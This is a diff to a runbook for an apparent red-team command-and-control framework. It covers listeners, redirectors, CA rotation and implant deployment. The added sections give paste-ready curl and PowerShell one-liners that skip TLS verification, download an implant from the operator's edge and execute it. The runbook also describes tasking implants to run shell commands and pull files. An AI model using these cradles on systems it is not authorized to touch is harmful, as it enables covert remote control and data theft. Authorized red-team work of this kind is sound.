@@ -27,20 +27,24 @@ an adversarial eye, and the CA rotation drill (Sec 6) swaps the engagement
 CA under live implants. Scale the addresses to the
 engagement's real infrastructure; the lifecycle steps do not change.
 
-> **Model update since these walks were executed.** Listeners and deployment
-> credentials have since been reworked (architecture.md Sec 6, Sec 8): the
-> `Listeners` configuration now names the operator front only, which carries
-> no implant ingress -- enrollment is refused on it outright -- while
-> implant-facing listeners are engagement-scoped, created through the operator
-> API, persisted across restarts, and enforced at enrollment (the enroll
-> ingress Sec 2 and Sec 4 configure therefore becomes an engagement-scoped
-> listener bound behind the same edge). A payload build names its engagement's
-> listener, and the build mints and bakes the enrollment credential itself --
-> the artifact deploys with zero run-time arguments, and the manual mint
-> below remains the rotation and re-entry path (Sec 6's fresh-token-per-implant
-> drill is unchanged). Read the mint and listener-configuration steps in
-> Sec 2-4 as the shapes they were; the composed acceptance points they prove
-> are unchanged.
+> **Model update since these walks were executed.** Listeners, deployment
+> credentials, and delivery have since been reworked (architecture.md Sec 6,
+> Sec 8): the `Listeners` configuration now names the operator front only,
+> which carries no implant ingress -- enrollment is refused on it outright --
+> while implant-facing listeners are engagement-scoped, created through the
+> operator API, persisted across restarts, and enforced at enrollment (the
+> enroll ingress Sec 2 and Sec 4 configure therefore becomes an
+> engagement-scoped listener bound behind the same edge). A payload build
+> names its engagement's listener and mints and bakes the enrollment
+> credential itself -- the artifact deploys with zero run-time arguments.
+> Delivery no longer builds a loader artifact: the launcher render
+> (`POST /engagements/{id}/launchers`) answers the paste-ready one-liners
+> per shell family, each fetching the payload over the engagement's web
+> front under a freshly minted download credential. The procedures below
+> are rewritten to that surface; the acceptance-evidence blocks stay the
+> dated record of the runs that produced them (those runs rode the era's
+> loader flow), and the composed acceptance points they prove are
+> unchanged.
 
 ## 1. Provision the infrastructure
 
@@ -92,7 +96,7 @@ variables; `appsettings` sections are equivalent):
 | Listener | Transport | Purpose |
 |----------|-----------|---------|
 | `beacon` | `Mtls` | The implant contact channel. Public endpoint is the primary redirector; implants present the CA-signed leaf here. |
-| `enroll-http` | `Http` | The certificate-less ingress stage-1 rides: enroll and stage-2 fetch hold no leaf yet, so an mTLS listener cannot serve their TLS handshake. In a real deployment the operator's TLS-terminating edge fronts this shape ([architecture.md](../architecture.md) Sec 8); on the rehearsal host it is loopback plain HTTP standing in for that edge. |
+| `enroll-http` | `Http` | The certificate-less ingress the launcher one-liners and enrollment ride: the payload fetch and enroll hold no leaf yet, so an mTLS listener cannot serve their TLS handshake. In a real deployment the operator's TLS-terminating edge fronts this shape ([architecture.md](../architecture.md) Sec 8); on the rehearsal host it is loopback plain HTTP standing in for that edge. |
 | `operator-http` | `Http` | The operator API and UI. Keep it loopback or behind the crew's VPN/TLS edge -- credentials cross it in the clear otherwise. |
 
 ```
@@ -113,20 +117,34 @@ misconfigured listener -- that is the acceptance for step zero.
 ## 3. Walk the lifecycle
 
 1. **Log in and open the engagement**: `POST /operators/login`, create the
-   engagement, mint a stager token (`POST /engagements/{id}/stager-tokens`).
-   The secret shows once.
-2. **Build the stage-2** with the beacon profile baked: endpoint is the
+   engagement. Delivery cuts its own credential at the render below; the
+   manual deploy-token mint (`POST /engagements/{id}/deploy-tokens`)
+   serves the credential-free artifact shape, whose secret rides run-time
+   flags instead of the bake.
+2. **Build the payload** with the beacon profile baked: endpoint is the
    enroll ingress, `fallbackEndpoints` carries the fallback front, sleep
-   and jitter to the engagement's cadence, kill date to its window.
-3. **Build the stage-1 stager** naming the stage-2 (`class: stager`,
-   `stage2PayloadId`), download both artifacts.
-4. **Deploy**: run the stager where the engagement needs presence. With the
-   split topology, name the beacon front and the CA pin:
-   `./Rod.Stager -token <secret> -enroll-url https://<edge>/implants/enroll
-   -payload <stage2-id> -beacon-url https://<front-a>:443 -ca-cert ca.crt`.
-   The stager fetches the stage-2, verifies the baked fingerprint, runs it,
-   and hands the credential over; the stage-2 enrols against the external
-   CA and appears on the roster (`GET /engagements/{id}/presence`).
+   and jitter to the engagement's cadence, kill date to its window. The
+   build mints and bakes the enrollment credential itself -- the artifact
+   deploys with zero run-time arguments.
+3. **Render the launchers**: `POST /engagements/{id}/launchers` answers the
+   paste-ready one-liner per shell family -- the disk trio (curl, wget,
+   PowerShell) plus the Linux in-memory memfd family -- each fetching the
+   payload over the engagement's web front under a freshly minted download
+   credential. Every render is kept as a row: re-copy it while the
+   credential lives, watch its budget spend as targets pull it, revoke or
+   delete it from the same list.
+4. **Deploy**: paste the family that fits the target where the engagement
+   needs presence. The disk family's shape (the render carries the real URL
+   and credential):
+   `curl -kfsSL -H 'X-Deploy-Token: <secret>'
+   https://<edge>/implants/payloads/<id> -o /tmp/.rod-payload &&
+   chmod +x /tmp/.rod-payload && /tmp/.rod-payload`.
+   An https front's TLS terminates against the engagement CA, which no
+   stock target toolchain trusts, so each family's one-liner carries its
+   own verification bypass -- the credential gates the fetch, and the
+   fetched artifact's enroll pins the CA. The artifact enrols against the
+   external CA and appears on the roster
+   (`GET /engagements/{id}/presence`).
 5. **Task and collect**: issue verbs over
    `POST /engagements/{id}/tasks`; results land on the task and in the
    audit trail. Bulk collection (`file.pull` of a multi-megabyte file)
@@ -193,7 +211,7 @@ address substitution alone.
 operator + target host (Windows, 10.3.16.23)      teamserver host (Linux, 172.17.67.116)
   rod-redirector -listen :443  (primary) --- L4 -->  beacon mTLS   0.0.0.0:9443
   rod-redirector -listen :8443 (fallback) -- L4 -->  beacon mTLS   0.0.0.0:9443
-  Rod.Stager.exe / Rod.Implant.exe                   enroll        127.0.0.1:5080  <- edge :443
+  rod-payload.exe (a pasted one-liner)                enroll        127.0.0.1:5080  <- edge :443
   operator (curl, browser) -- TLS --> edge :9000 -->  operator API  127.0.0.1:5081
                                                      Postgres      127.0.0.1:5432
 ```
@@ -207,9 +225,13 @@ Two rules shape the edge ([redirectors.md](redirectors.md) Sec 7):
 - The mTLS beacon path is never TLS-terminated: a terminating hop cannot
   re-present the implant's client certificate upstream, so the beacon
   rides the L4 redirectors and only the certificate-less paths terminate.
-- The edge's certificate must chain to the engagement CA. The stager and
-  the stage-2 pin the CA -- chain-to-pinned-CA, not a hostname match --
-  so the edge validates exactly the way the teamserver itself would.
+- The edge's certificate must chain to the engagement CA. The fetched
+  artifact pins the CA at its enroll -- chain-to-pinned-CA, not a hostname
+  match -- so the edge validates exactly the way the teamserver itself
+  would. The one-liner's own fetch carries the family's verification
+  bypass instead (no stock downloader trusts the engagement CA; the
+  credential gates the fetch, and the enrollment that follows does the
+  pinning).
 
 ### The edge certificate
 
@@ -287,18 +309,21 @@ rod-redirector.exe -listen 0.0.0.0:8443 -upstream <teamserver-host>:9443   # fal
 ### Walk the lifecycle
 
 Every step of Sec 3 runs unchanged -- through the edge for login,
-engagement, token mint, payload builds, and artifact downloads (a
+engagement, launcher renders, payload builds, and artifact downloads (a
 Schannel-built curl cannot consume a pinned CA file; verify the edge
 chain with `openssl s_client -connect <edge>:9000 -CAfile ca.crt` --
 `Verify return code: 0` -- and drive the API over the so-verified TLS),
-and through the fronts for the implant:
+and through the fronts for the implant. The Windows family's shape (the
+render carries the real URL and credential):
 
 ```
-./Rod.Stager.exe -token <secret>   -enroll-url https://<edge-host>/implants/enroll   -payload <stage2-payload-id> -beacon-url https://<front-host>:443   -ca-cert ca.crt
+powershell -c "[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; $p=\"$env:TEMP\rod-payload.exe\"; iwr 'https://<edge-host>/implants/payloads/<id>' -Headers @{'X-Deploy-Token'='<secret>'} -OutFile $p; & $p"
 ```
 
-The stage-2 build names the edge in `Endpoint` and the fallback front in
-`FallbackEndpoints`; the stager names the primary front at run time.
+The payload build names the edge in `Endpoint` and the fallback front in
+`FallbackEndpoints`; the render names the front the one-liner fetches
+over (auto prefers https, or name the front the engagement's redirector
+serves).
 
 ## Acceptance evidence from the multi-host walk
 
@@ -391,12 +416,12 @@ swap, then the re-entry (architecture.md Sec 9).
    sudo chmod 640 /etc/rod/pki/ca.crt /etc/rod/pki/ca.key
    sudo systemctl restart rod-teamserver
    ```
-3. Re-enter the fleet: mint a fresh stager token per surviving implant
-   (the original was spent at its enroll), and redeploy through the
-   stager pinning the successor -- `./Rod.Stager.exe -token <new-secret>
-   ... -ca-cert ca2.crt`. Old stage-2 artifacts stay valid: their baked
-   enroll endpoint is the certificate-less ingress and the CA pin arrives
-   at run time through the stager, so no rebuild is needed.
+3. Re-enter the fleet: build a fresh payload (the build bakes the
+   successor CA as the pin the artifact's first contact validates
+   against -- pre-rotation artifacts pin the incumbent and cannot come
+   back), render a launcher for it, and paste the one-liner where
+   presence is needed. The render's download credential is fresh by
+   construction, so the spent originals cost nothing.
 
 Blast radius, measured on the executed drill (two live implants, tasking
 current):
@@ -412,10 +437,13 @@ current):
 - Untouched: operator cookies (the DataProtection key ring is not CA
   state), engagements, tasks, artifacts (byte-exact), the audit chain,
   and the enroll ingress, which kept answering on plain HTTP.
-- Re-entry verified end to end: a fresh token plus the successor pin
-  enrolled a new implant whose beacon completed mTLS against the rotated
-  CA, and `shell.exec` round-tripped after the swap.
+- Re-entry verified end to end on the era's loader flow (a fresh token
+  plus the successor pin); on the current surface the equivalent is the
+  fresh build-and-render above, and the acceptance point it proves -- a
+  new implant enrolling and completing its handshake against the rotated
+  CA -- is unchanged.
 
 Plan the cut accordingly: rotation is scheduled downtime for implant
-presence. Budget one fresh stager token per implant that must come back,
-and treat every pre-rotation leaf as dead the moment the service restarts.
+presence. Budget one fresh build-and-render per implant that must come
+back, and treat every pre-rotation leaf as dead the moment the service
+restarts.
